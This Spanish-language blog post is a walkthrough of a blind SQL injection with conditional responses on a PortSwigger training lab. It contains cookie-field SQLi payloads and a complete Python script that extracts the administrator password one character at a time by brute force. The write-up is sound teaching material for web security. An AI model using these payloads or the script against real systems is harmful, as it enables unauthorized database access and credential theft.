---
title: Blind SQL Injection - Conditional Response
date: '2023-04-24'
tags: ['HACKING', 'SQL', 'SQL INJECTION', 'PYTHON', 'WEB']
draft: false
summary: Aplicando una inyección seremos capaces de hacerle preguntas de respuesta binaria a la base de datos, preguntas que tengan como respuesta un “Sí” o un “No”. Si somos capaces de hacer las preguntas correctas seremos capaces de extraer información de la base de datos aplicando fuerza bruta.
images: ['/static/images/sqli-conditional-response/blind-sqli-conditional-twitter-card.png']
---

![Query param](/static/images/sqli-conditional-response/blind-sqli-conditional-twitter-card.png)

## Tabla de contenidos
1. [Introducción](#introduccion)
2. [Concepto del ataque](#concepto)
3. [Explotado la vulnerabilidad en el laboratorio](#explotando)  
    3.1 [Automatización del ataque](#automatizando)  

<a name="introduccion"/>
## Introducción

En este articulo veremos como explotar un SQL Injection (SQLi) a ciegas, el hecho de que sea a ciegas significa que no podremos visualizar directamente datos en la página web, como sí lo hacíamos con el SQLi UNION Attack. Hay varios tipos de inyecciones a ciegas, en este caso, vamos a estar explotando una inyección de respuesta condicional. 

Antes de seguir leyendo, si nunca antes has explotado un SQLi UNION Attack ([https://naker-dev.vercel.app/blog/sql-injection-union-attack](https://naker-dev.vercel.app/blog/sql-injection-union-attack)) te recomiendo que empieces por ahí ya que entenderás mejor las inyecciones a ciegas.

Para hacer más visual el articulo usaremos uno de los laboratorios de PortSwigger ([https://portswigger.net/](https://portswigger.net/)) concretamente el laboratorio **[Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses).**

<a name="concepto"/>
## Concepto del ataque

En muchas ocasiones la inyección SQL no reflejará los datos de la BD en la página web, ni tampoco romperá la ejecución de la web (un error 500), simplemente la aplicación se comportará de forma diferente en función de si la consulta que inyectemos se resuelve como verdadera o como falsa. De ahí el nombre de inyección de respuesta condicional. 

Aplicando una inyección seremos capaces de hacerle preguntas de respuesta binaria a la base de datos, preguntas que tengan como respuesta un “Sí” o un “No”. Si somos capaces de hacer las preguntas correctas seremos capaces de extraer información de la base de datos aplicando fuerza bruta.

Como ejemplo ilustrativo, podríamos preguntarle a la BD: *¿La contraseña del usuario ‘administrator’ empieza por la letra ‘a’?* En caso de que la respuesta sea afirmativa ya sabríamos la primera letra de la contraseña, de forma iterativa podríamos seguir preguntando por el resto de posiciones hasta finalmente obtener la contraseña completa.

La forma en la que veremos la respuesta de la BD (si la respuesta es “Sí” o “No”) pueden ser varías: 

- Renderizar o no un texto en la web
- Renderizar o no una sección entera (la cabecera, el píe de la web, el menú de usuario, etc)
- Cargar o no una cookie
- Guardar o no una clave en el *localStorage/sessionStorage*
- …

La forma de poder determinar si la respuesta a la inyección es un “Sí” o un “No” pueden ser varías y a cada caso diferente, deberemos indagar manualmente para poder determinar que comportamiento de la web nos dará la respuesta de la inyección. En el ejemplo que explotaremos posteriormente quedará más claro este concepto.

<a name="explotando"/>
## Explotado la vulnerabilidad en el laboratorio

Previa explotación, debemos saber que el laboratorio nos da la estructura de las tablas de la BD para no tener que sacarlas por fuerza bruta. Sabemos que existe una tabla llamada `Users` que contiene un usuario llamado `adminitrator`. Toda está información podríamos extraerla nosotros mismos pero nos llevaría bastante tiempo.

La inyección en este caso la haremos sobre un campo de la *cookie.* El campo *trackingId* es vulnerable a SQLi. 

Si nos fijamos en la web veremos un texto: “Welcome back!”:

![Query param](/static/images/sqli-conditional-response/1.png)

Si inyectamos una consulta que se resuelva como verdadera, como por ejemplo:

`n2fI6yGTKRibLzj8' AND 1=1 -- -`

![Query param](/static/images/sqli-conditional-response/2.png)

El texto “Welcome back!” sigue siendo visible:

En caso de inyectar una consulta que se resuelva como falsa dejaremos de ver el texto:

`n2fI6yGTKRibLzj8' AND 1=2 -- -`

![Query param](/static/images/sqli-conditional-response/3.png)

¡Hemos encontrado una forma de interpretar las respuestas “Sí”/“No” por parte de nuestra BD!

Teniendo en cuenta que el objetivo del laboratorio es extraer la contraseña del usuario `administrator` podemos generar un *payload* para inyección SQL que le pregunte a la BD algo como *¿La contraseña del usuario ‘administrator’ empieza por la letra ‘a’?*

La sentencia SQL a inyectar quedaría algo así:

`n2fI6yGTKRibLzj8' AND (SELECT substring(password, 1, 1) FROM users WHERE username LIKE 'administrator') = 'a' -- -`

En caso de que la respuesta se resuelva como afirmativa veremos el texto “Welcome back!” en la pantalla, de lo contrario no lo veremos. De esta forma somos capaces de terminar de qué caracteres se compone la contraseña, iterando por cada posición del campo. 

**Hay que tener en cuenta que estamos haciendo las pruebas sobre una BD PostgreSQL, por eso usamos la función `substring` para extraer un carácter de una posición concreta del campo. En caso de ser otro motor de BD habría que adaptar esta parte de la consulta.**

<a name="automatizando"/>
### Automatización del ataque

Sería una locura intentar sacar por fuerza bruta todos los caracteres de la contraseña de forma manual por lo que haremos un pequeño script que automatice el ataque e itere sobre todos las posiciones de la contraseña probando diferentes caracteres que definiremos en un diccionario.

El script en este caso lo he hecho en Python:

```python
import requests
import string

dictionary = string.ascii_lowercase + string.digits #[a-z0-9] 
url = "https://0a4400f7035bc8938449ae2700620002.web-security-academy.net/filter?category=Gifts"
trackingId = "UXenCJxCQPYRW0EV"
session = "BHLKJiOKcd68WYjIyaXpzlTPMNdTPnnh"

def bruteForce(password_index):
	for char in dictionary:
		cookies = {
			"TrackingId": f"{trackingId}' AND (SELECT substring(password, {password_index}, 1) FROM users WHERE username LIKE 'administrator') = '{char}' -- -",
			"session": f"{session}"
		}
		r = requests.get(url=url, cookies=cookies)
		body = r.text
		if "Welcome back!" in body:
			return char
	return -1

def main():
	is_running=True
	password=""
	password_index = 1
	while(is_running):
		discovered_char = bruteForce(password_index)
		if(discovered_char == -1):
			is_running=False
			break
		password = password + discovered_char
		password_index = password_index + 1
		print(password)

if __name__ == "__main__":
	main()
```

En este caso usamos un diccionario que contiene letras minúsculas de las a a la z y números del 0 al 9. Habría que adaptar el diccionario según el caso concreto.

El resultado del script vendría a ser algo similar a esto:

![Query param](/static/images/sqli-conditional-response/4.png)

La contraseña debería ser el último output del script `rqjydfesdyw9t5v07n2l`. Cabe destacar que el script se podría limpiar y mejorar para que no arroje tanta información incompleta pero para el caso nos vale de sobra.

¡Solved!

![Query param](/static/images/sqli-conditional-response/5.png)

Gracias por leer.